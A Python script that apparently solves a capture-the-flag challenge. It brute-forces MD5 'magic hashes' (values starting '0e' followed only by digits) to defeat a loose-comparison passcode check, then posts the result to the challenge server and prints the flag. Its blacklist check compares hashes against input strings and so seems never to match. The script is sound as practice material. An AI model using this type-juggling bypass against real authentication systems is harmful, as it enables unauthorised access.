#!/usr/bin/python3
import hashlib
import re
from requests import post

prefix = '0e'
back_list = ["0e215962017", "0e730083352", "0e807097110", "0e840922711"]


def req(hash):
    url = "http://find-pass-code-two.kshackzone.com/"

    r = post(url, data={"pass_code" : f"{hash}"})
    print(re.findall("KCTF{.*", r.text)[0])

def breakit():
    iters = 840922711
    while 1:
        s = (prefix + str(iters)).encode()
        hashed_s = hashlib.md5(s).hexdigest()
        iters += 1
        #print(type(hashed_s))
        r = re.match('^0e[0-9]{30}', hashed_s)
        if r:
            if hashed_s not in back_list:
                print("[+] found! md5( {} ) ---> {}".format(s, hashed_s))
                print("[+] in {} iterations".format(iters))
                req(hashed_s)
                break

        # if iters % 1000000 == 0:
        #     print("[+] current value: {}       {} iterations, continue...".format(s, iters))

breakit()